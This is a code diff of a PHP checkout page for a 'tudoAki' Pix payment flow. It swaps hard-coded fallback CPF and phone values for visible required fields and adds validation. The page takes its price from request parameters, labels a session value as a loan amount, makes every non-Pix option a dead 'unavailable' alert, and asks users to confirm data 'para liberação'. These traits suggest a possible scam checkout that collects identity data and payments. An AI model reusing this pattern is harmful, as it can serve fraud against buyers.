@@ -4,17 +4,12 @@ if (session_status() === PHP_SESSION_NONE) {
 }
 
 $dados = $_SESSION['dados_cadastro'] ?? [];
-$nome  = !empty($dados['nome']) ? $dados['nome'] : 'Cliente tudoAki';
-$cpf   = !empty($dados['cpf']) ? preg_replace('/[^0-9]/', '', $dados['cpf']) : '11144477735';
-if (strlen($cpf) !== 11) { $cpf = '11144477735'; }
-
-// Garante um telefone padrão válido caso venha vazio
-$tel   = !empty($dados['telefone']) ? preg_replace('/[^0-9]/', '', $dados['telefone']) : '11999999999';
-if (strlen($tel) < 10) { $tel = '11999999999'; }
-
+$nome  = !empty($dados['nome']) ? $dados['nome'] : '';
+$cpf   = !empty($dados['cpf']) ? $dados['cpf'] : '';
+$tel   = !empty($dados['telefone']) ? $dados['telefone'] : '';
 $servico = $dados['servico'] ?? $_GET['servico'] ?? $_POST['servico'] ?? 'Kit Especial tudoAki 2026';
 
-// Valor total alinhado em R$ 437,23
+// Valor total alinhado rigorosamente em R$ 437,23
 $valorPalpite = $_GET['valor'] ?? $_POST['valor'] ?? $_SESSION['valor_emprestimo'] ?? $dados['valor'] ?? '427.41';
 $valorFloat = (float)$valorPalpite;
 if ($valorFloat < 400) {
@@ -49,7 +44,7 @@ $valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
 </head>
 <body class="bg-gray-100 min-h-screen font-sans text-gray-800 flex flex-col justify-between">
 
-    <!-- Topo Fiel ao Layout -->
+    <!-- Topo Fiel ao Varejo -->
     <header class="bg-white border-b border-gray-200 shadow-sm py-3 px-6 relative">
         <div class="max-w-7xl mx-auto flex items-center justify-between">
             <a href="index.php" class="flex items-center gap-2">
@@ -65,37 +60,44 @@ $valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
     <!-- Conteúdo Principal -->
     <main class="max-w-7xl w-full mx-auto p-4 md:p-8 my-2 flex-grow">
 
-        <h1 class="text-2xl md:text-3xl font-bold text-blue-cb mb-6">Pagamento</h1>
+        <h1 class="text-2xl md:text-3xl font-bold text-blue-cb mb-6">Identificação e Pagamento</h1>
 
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 items-start">
             
-            <!-- Coluna da Esquerda: Opções de Pagamento -->
+            <!-- Coluna da Esquerda: Formulário de Dados + Pagamento -->
             <div class="lg:col-span-2 space-y-4">
                 
-                <!-- Cupons de Desconto -->
-                <div class="bg-white rounded-xl p-4 shadow-sm border border-gray-200 flex justify-between items-center cursor-pointer hover:border-blue-cb transition">
-                    <div>
-                        <h3 class="text-xs font-bold text-blue-cb uppercase tracking-wide">Cupons de desconto</h3>
-                        <p class="text-xs text-gray-500">Resgate seu desconto</p>
-                    </div>
-                    <i class="fa-solid fa-plus text-blue-cb font-bold"></i>
-                </div>
-
-                <div class="text-xs font-bold text-gray-700 uppercase tracking-wider pt-2">Como você deseja pagar?</div>
-
-                <!-- Formulário com valor sincronizado -->
-                <form id="form-identificacao" class="space-y-3">
+                <form id="form-identificacao" class="space-y-4">
                     <input type="hidden" name="payment_method" value="pix">
                     <input type="hidden" name="servico" value="<?php echo htmlspecialchars($servico); ?>">
                     <input type="hidden" name="valor" id="input-valor-hidden" value="<?php echo $valorTotalGeral; ?>">
-                    
-                    <!-- Campos exploidados para garantir que a API receba tudo sem falhar -->
-                    <input type="hidden" name="nome" id="input-nome" value="<?php echo htmlspecialchars($nome); ?>">
-                    <input type="hidden" name="cpf" id="input-cpf" value="<?php echo htmlspecialchars($cpf); ?>">
-                    <input type="hidden" name="telefone" id="input-telefone" value="<?php echo htmlspecialchars($tel); ?>">
-                    <input type="hidden" name="phone" id="input-phone" value="<?php echo htmlspecialchars($tel); ?>">
 
-                    <!-- Opção PIX -->
+                    <!-- Bloco de Identificação Obrigatória (Campos Visíveis) -->
+                    <div class="bg-white rounded-2xl p-6 shadow-sm border border-gray-200 space-y-4">
+                        <h2 class="text-xs font-bold text-blue-cb uppercase tracking-wider border-b border-gray-100 pb-2">
+                            <i class="fa-solid fa-user-shield mr-1"></i> 1. Confirme seus dados para liberação
+                        </h2>
+
+                        <div>
+                            <label class="block text-[11px] font-bold text-gray-700 uppercase mb-1">Nome Completo</label>
+                            <input type="text" name="nome" id="input-nome" value="<?php echo htmlspecialchars($nome); ?>" required placeholder="Digite seu nome completo" class="w-full px-4 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs focus:outline-none focus:border-blue-cb transition">
+                        </div>
+
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-[11px] font-bold text-gray-700 uppercase mb-1">CPF (somente números)</label>
+                                <input type="text" name="cpf" id="input-cpf" value="<?php echo htmlspecialchars($cpf); ?>" required placeholder="00000000000" maxlength="11" class="w-full px-4 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs focus:outline-none focus:border-blue-cb transition">
+                            </div>
+                            <div>
+                                <label class="block text-[11px] font-bold text-gray-700 uppercase mb-1">Telemóvel / WhatsApp</label>
+                                <input type="text" name="phone" id="input-phone" value="<?php echo htmlspecialchars($tel); ?>" required placeholder="11999999999" maxlength="11" class="w-full px-4 py-2.5 bg-gray-50 border border-gray-300 rounded-xl text-xs focus:outline-none focus:border-blue-cb transition">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="text-xs font-bold text-gray-700 uppercase tracking-wider pt-2">2. Como você deseja pagar?</div>
+
+                    <!-- Opção PIX com Botão de Envio -->
                     <button type="submit" class="w-full text-left payment-card bg-white rounded-xl p-4 shadow-sm border-2 border-emerald-600 cursor-pointer flex justify-between items-center transition">
                         <div class="flex items-start gap-3">
                             <i class="fa-solid fa-qrcode text-emerald-600 text-xl mt-1"></i>
@@ -105,11 +107,11 @@ $valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
                                 <span class="text-sm font-black text-emerald-700 mt-1 block">R$ <span id="display-valor-texto"><?php echo $valorFormatado; ?></span> à vista</span>
                             </div>
                         </div>
-                        <span class="bg-emerald-600 text-white font-bold text-xs px-3 py-2 rounded-lg shadow">Gerar PIX Agora <i class="fa-solid fa-arrow-right ml-1"></i></span>
+                        <span class="bg-emerald-600 text-white font-bold text-xs px-4 py-2.5 rounded-lg shadow">Gerar PIX Agora <i class="fa-solid fa-arrow-right ml-1"></i></span>
                     </button>
                 </form>
 
-                <!-- Outras opções -->
+                <!-- Outras opções visuais -->
                 <div onclick="alert('Opção temporariamente indisponível. Utilize o Pix.')" class="payment-card bg-white rounded-xl p-4 shadow-sm border border-gray-200 cursor-pointer flex justify-between items-center opacity-70">
                     <div class="flex items-start gap-3">
                         <i class="fa-solid fa-file-invoice-dollar text-blue-cb text-xl mt-1"></i>
@@ -171,7 +173,7 @@ $valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
                     </div>
 
                     <div class="text-center text-[11px] text-gray-500 pt-3 border-t border-gray-100">
-                        Clique em Gerar PIX para finalizar com aprovação imediata.
+                        Preencha seus dados acima e clique em Gerar PIX.
                     </div>
                 </div>
             </div>
@@ -211,6 +213,16 @@ $valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
+                // Recolhe e limpa os dados diretamente dos inputs visíveis preenchidos pelo utilizador
+                const nomeVal = document.getElementById('input-nome').value.trim();
+                const cpfVal = document.getElementById('input-cpf').value.replace(/\D/g, '');
+                const phoneVal = document.getElementById('input-phone').value.replace(/\D/g, '');
+
+                if (!nomeVal || cpfVal.length !== 11 || phoneVal.length < 10) {
+                    alert('Por favor, preencha o Nome, um CPF válido com 11 dígitos e o Telemóvel corretamente.');
+                    return;
+                }
+
                 document.getElementById('loading-title').innerText = 'Gerando seu PIX';
                 document.getElementById('loading-sub').innerText = 'Conectando ao sistema de pagamentos...';
                 document.getElementById('modal-spinner').classList.remove('hidden');
@@ -218,15 +230,15 @@ $valorProdutoFmt = number_format($valorFloat, 2, ',', '.');
                 document.getElementById('btn-modal-close').classList.add('hidden');
                 loadingModal.classList.remove('hidden');
 
-                // Envia explicitamente os campos phone e customer_phone junto com os demais
-                const phoneVal = (document.getElementById('input-phone').value || "11999999999").replace(/\D/g, '');
                 const dataObj = {
                     payment_method: 'pix',
                     servico: "<?php echo htmlspecialchars($servico); ?>",
                     valor: valorGlobalTransacao,
                     amount: valorGlobalTransacao,
-                    nome: document.getElementById('input-nome').value || "Cliente tudoAki",
-                    cpf: (document.getElementById('input-cpf').value || "11144477735").replace(/\D/g, ''),
+                    nome: nomeVal,
+                    customer_name: nomeVal,
+                    cpf: cpfVal,
+                    customer_cpf: cpfVal,
                     telefone: phoneVal,
                     phone: phoneVal,
                     customer_phone: phoneVal
